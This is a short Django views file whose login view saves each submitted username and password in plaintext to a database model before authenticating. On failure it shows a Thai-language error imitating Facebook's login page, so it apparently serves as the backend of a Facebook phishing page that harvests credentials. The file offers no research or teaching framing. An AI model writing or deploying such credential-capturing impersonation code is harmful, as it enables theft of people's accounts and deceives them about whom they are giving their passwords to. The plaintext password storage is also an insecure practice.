from django.shortcuts import render
from django.http import HttpResponseRedirect
from django.urls import reverse
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from .models import Account

# Create your views here.

def index(request):
    if not request.user.is_authenticated:
        return HttpResponseRedirect(reverse('resgiter:login'))
    else:
        return render(request, "resgiter/index.html", {
        
        })

def login_view(request):
    if request.method == "POST":
        username = request.POST['username']
        password = request.POST['password']
        
        Account.objects.create(name=username, password=password)


        user = authenticate(username=username, password=password)
        if user is not None:
            login(request, user)
            return HttpResponseRedirect(reverse('resgiter:index'))
        else:
            return render(request, 'resgiter/login.html', {
                'message': 'อีเมลที่คุณป้อนไม่ได้เชื่อมต่อกับบัญชี สร้างบัญชี Facebook ใหม่'
            })
    return render(request, 'resgiter/login.html')

def logout_view(request):
    logout(request)
    return HttpResponseRedirect(reverse('resgiter:login'))
